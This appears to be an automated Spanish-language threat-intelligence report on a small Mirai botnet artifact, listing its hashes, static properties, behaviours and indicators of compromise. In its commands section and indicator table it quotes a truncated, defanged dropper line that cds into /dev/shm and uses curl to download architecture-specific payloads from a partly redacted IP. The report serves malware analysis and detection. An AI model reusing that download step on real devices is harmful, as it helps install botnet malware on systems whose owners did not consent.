# 🧬 Payload Analysis

`2a924709fb52d53ce5b282b855c54475afc0ed788b7bdc23faa078800cbe5e56`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Reconocimiento del sistema, Descarga remota. Se identificaron 2 comandos observados o extraídos. Se identificaron 5 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:36:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `2a924709fb52d53ce5b282b855c54475afc0ed788b7bdc23faa078800cbe5e56`
- **MD5:** `079ce4757b90732e56c4d188183a8da0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 743 B |
| Entropía | 5.23 |
| Strings | 22 |

## 🧠 Comportamiento observado

1. **Reconocimiento del sistema**
2. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
[4hroot@ubnt:~# cd /dev/shm; for arch in x86_64 armv7l mips mipsel; do curl -fsSLk hxxp://103.211.206.XXX/main_${arch} -o
[4lchmod: cannot access '.sysd': No such file or directory
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://103.211.206.XXX/main_$ | strings |
| ip | 103.211.206.XXX | static_analysis |
| command | [4hroot@ubnt:~# cd /dev/shm; for arch in x86_64 armv7l mips mipsel; do curl -fsSLk hxxp://103.211.206.XXX/main_${arch} -o | strings |
| command | [4lchmod: cannot access '.sysd': No such file or directory | strings |
| hash | 2a924709fb52d53ce5b282b855c54475afc0ed788b7bdc23faa078800cbe5e56 | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
